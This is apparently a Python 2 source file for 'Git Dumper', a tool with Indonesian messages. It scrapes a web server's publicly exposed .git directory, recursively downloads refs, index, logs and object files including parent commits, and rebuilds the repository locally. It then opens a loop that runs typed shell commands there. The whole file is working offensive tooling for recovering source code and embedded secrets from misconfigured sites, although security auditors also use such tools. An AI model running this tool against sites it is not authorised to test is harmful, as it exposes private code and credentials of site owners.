#https://github.com/Jenderal92/git-dump/
import subprocess
import os
from urlparse import urlparse, urljoin
import requests
from bs4 import BeautifulSoup
import re
import zlib
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

init(autoreset=True)

MAX_DEPTH = 5
session = requests.Session()
session.headers.update({'User-Agent': 'Mozilla/5.0'})
session.timeout = 30

retry_strategy = Retry(
    total=3,
    status_forcelist=[429, 500, 502, 503, 504],
    backoff_factor=1
)
adapter = HTTPAdapter(max_retries=retry_strategy)
session.mount("http://", adapter)
session.mount("https://", adapter)

downloaded_cache = set()

def is_safe_path(path):
    return not (".." in path or path.startswith("/") or "\\" in path)

def get_indexed_files(response):
    html = BeautifulSoup(response.text, "html.parser")
    files = []
    for link in html.find_all("a"):
        href = link.get("href")
        url = urlparse(href)
        if href and is_safe_path(href) and not url.scheme and not url.netloc and '?' not in href:
            files.append(href)
    return files

def download_file(base_url, file_path, output_dir):
    url = urljoin(base_url, file_path)
    if file_path in downloaded_cache:
        print("File {} sudah diunduh sebelumnya, melewati...".format(file_path))
        return  
    try:
        print("Mengunduh file: {}".format(file_path))
        response = session.get(url, timeout=30) 
        if response.status_code == 200:
            full_path = os.path.join(output_dir, file_path)
            if not os.path.exists(os.path.dirname(full_path)):
                os.makedirs(os.path.dirname(full_path))
            with open(full_path, "wb") as f:
                for chunk in response.iter_content(chunk_size=8192):
                    if chunk:
                        f.write(chunk)
            print("Selesai mengunduh: {}".format(file_path))
            downloaded_cache.add(file_path)
        else:
            print("Gagal mengunduh file (status code: {}): {}".format(response.status_code, file_path))
    except requests.exceptions.RequestException as e:
        print("Error saat mengunduh {}: {}".format(file_path, e))

def analyze_git_file_for_sha1(file_path):
    sha1_list = []
    if not os.path.exists(file_path):
        print("Error: File tidak ada untuk dianalisis - {}".format(file_path))
        return sha1_list

    try:
        with open(file_path, "r") as f:
            content = f.read()
            sha1_list += re.findall(r'\b[0-9a-f]{40}\b', content)
    except Exception as e:
        print("Error saat menganalisis {}: {}".format(file_path, e))
    return sha1_list

def download_object_recursively(base_url, sha1, output_dir, visited):
    if sha1 in visited:
        print("SHA-1 {} sudah diunduh sebelumnya, melewati...".format(sha1))
        return
    visited.add(sha1)
    object_path = "objects/{}/{}".format(sha1[:2], sha1[2:])
    url = urljoin(base_url, object_path)
    try:
        print("Mengunduh object: {}".format(sha1))
        response = session.get(url, timeout=30)
        if response.status_code == 200:
            object_dir = os.path.join(output_dir, "objects", sha1[:2])
            if not os.path.exists(object_dir):
                os.makedirs(object_dir)
            object_file = os.path.join(object_dir, sha1[2:])
            with open(object_file, "wb") as f:
                f.write(response.content)
            print("Selesai mengunduh object: {}".format(sha1))
            with open(object_file, "rb") as f:
                obj_data = zlib.decompress(f.read())
                if obj_data.startswith(b"commit"):
                    parent_hashes = re.findall(r'parent ([0-9a-f]{40})', obj_data.decode("utf-8", errors="ignore"))
                    for parent_sha1 in parent_hashes:
                        download_object_recursively(base_url, parent_sha1, output_dir, visited)
        else:
            print("Gagal mengunduh object (status code: {}): {}".format(response.status_code, sha1))
    except requests.exceptions.RequestException as e:
        print("Error saat mengunduh object {}: {}".format(sha1, e))
    except Exception as e:
        print("Kesalahan saat memproses object {}: {}".format(sha1, e))

def download_directory_recursively(base_url, current_path, output_dir, visited, depth=0):
    if depth > MAX_DEPTH:
        print("Kedalaman maksimum tercapai, melewati path: {}".format(current_path))
        return
    url = urljoin(base_url, current_path)
    attempts = 3 
    for attempt in range(attempts):
        try:
            print("Mengakses direktori: {} (percobaan ke-{})".format(current_path, attempt + 1))
            response = session.get(url, timeout=30)
            if response.status_code == 200:
                files = get_indexed_files(response)
                with ThreadPoolExecutor(max_workers=5) as executor:
                    futures = []
                    for file in files:
                        file_path = urljoin(current_path, file)
                        if file.endswith('/'):
                            futures.append(executor.submit(download_directory_recursively, base_url, file_path, output_dir, visited, depth + 1))
                        else:
                            futures.append(executor.submit(download_file, base_url, file_path, output_dir))
                            downloaded_path = os.path.join(output_dir, file_path)
                            if file_path.endswith(('packed-refs', 'index', 'logs/HEAD')) or 'refs/' in file_path:
                                sha1_hashes = analyze_git_file_for_sha1(downloaded_path)
                                for sha1 in sha1_hashes:
                                    download_object_recursively(base_url, sha1, output_dir, visited)
                    for future in as_completed(futures):
                        try:
                            future.result()
                        except Exception as e:
                            print("Kesalahan saat mengunduh direktori: {}".format(e))
                break  
            else:
                print("Gagal mengakses direktori (status code: {}): {}".format(response.status_code, current_path))
        except requests.exceptions.RequestException as e:
            print("Error saat mengakses direktori {}: {}, percobaan ulang ke-{}".format(current_path, e, attempt + 1))
            time.sleep(2)  

def add_safe_directory(folder_path):
    folder_path = os.path.abspath(folder_path)
    if folder_path.endswith('.git'):
        folder_path = os.path.dirname(folder_path)

    try:
        cmd = ["git", "config", "--global", "--add", "safe.directory", folder_path]
        subprocess.check_call(cmd)
        print("Ditambahkan safe.directory untuk {}".format(folder_path))
    except subprocess.CalledProcessError as e:
        print("Error saat mengatur safe.directory: {}".format(e))


def run_manual_command_in_folder(folder_path):
    folder_path = os.path.abspath(folder_path)

    if folder_path.endswith('.git'):
        folder_path = os.path.dirname(folder_path)

    if not os.path.isdir(os.path.join(folder_path, ".git")):
        print("Error: {} tidak berisi folder .git dan bukan repository Git.".format(folder_path))
        return

    os.chdir(folder_path)
    print("Berpindah ke direktori kerja: {}".format(folder_path))

    while True:
        manual_command = raw_input("Masukkan perintah untuk dieksekusi secara manual (ketik 'exit' untuk keluar): ")
        if manual_command.lower() == 'exit':
            print("Keluar dari mode perintah manual.")
            break
        if manual_command:
            try:
                subprocess.check_call(manual_command, shell=True)
                print("Berhasil mengeksekusi: {}".format(manual_command))
            except subprocess.CalledProcessError as e:
                print("Error saat mengeksekusi perintah manual: {}".format(e))

if __name__ == "__main__":
    os.system('cls' if os.name == 'nt' else 'clear')
    print("{} Git Dumper  | {}Shin Code\n".format(Fore.YELLOW, Fore.CYAN))
    base_url = raw_input("Enter the base URL: ")
    domain_name = urlparse(base_url).hostname
    output_dir = os.path.join(".", domain_name, ".git")
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)

    visited = set()
    download_directory_recursively(base_url, '', output_dir, visited)
    add_safe_directory(output_dir)
    run_manual_command_in_folder(output_dir)
